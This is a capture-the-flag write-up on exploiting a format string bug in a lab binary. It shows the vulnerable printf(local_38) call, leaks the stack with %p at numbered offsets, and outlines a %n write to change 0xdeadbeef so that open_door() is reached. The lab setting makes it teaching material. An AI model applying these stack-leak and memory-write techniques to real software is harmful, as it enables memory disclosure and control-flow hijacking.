![image](https://github.com/user-attachments/assets/65a31a5d-46d6-45d1-8cd5-471c9c51e2f4)
cat flag is in the open_door()

![image](https://github.com/user-attachments/assets/006bb54f-72c6-4058-87fd-11a35719c698)

access open_door() use Format string attack 
Description
The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
![image](https://github.com/user-attachments/assets/12771037-f152-45bb-bda6-5732bf091ee6)
  printf("\nYour card is: ");
  printf(local_38)
Information Leaks Occurs Because:
When there are not enough arguments:
printf doesn't know there are no arguments!

It still expects the number of arguments to be the format specifier
So it keeps reading up the stack

printf Reads Stack Continuously
Stack Contains Important Data Such As:

Memory Address
Other Variable Values
Return Addresses
Canary Values

Summary: printf Becomes a "Stack Reader" That We Control! 💥
![image](https://github.com/user-attachments/assets/26d2f946-ef18-4ba0-8de9-cd581813e3a4)


use %p to read stack
![image](https://github.com/user-attachments/assets/5fccff62-b267-44a2-a478-dbed40d029fe)

found 0xdeadbeef we want to access open_door()
todo change local_48 = 0xdeadbeef----->0xdead1337
use %n to Writes the number of characters into a pointer
printf(format_string, arg2, arg3, arg4, ...)
                  ↑     ↑     ↑
                %1$   %2$   %3$
![image](https://github.com/user-attachments/assets/b1ce3d9c-5bc6-4bad-9311-a039f1d53b5c)
%1$p → 0x7ffc19f74c60  ← ที่อยู่ของ local_38 (format string)
%2$p → 0x7faae4fdd8c0  ← ข้อมูลอื่นๆ
%3$p → (nil)
%4$p → 0xf
%5$p → (nil) 
%6$p → 0xdeadbeef      ← local_48 (target)
%7$p → 0x7ffc19f77300  ← local_40 (pointer to local_48)


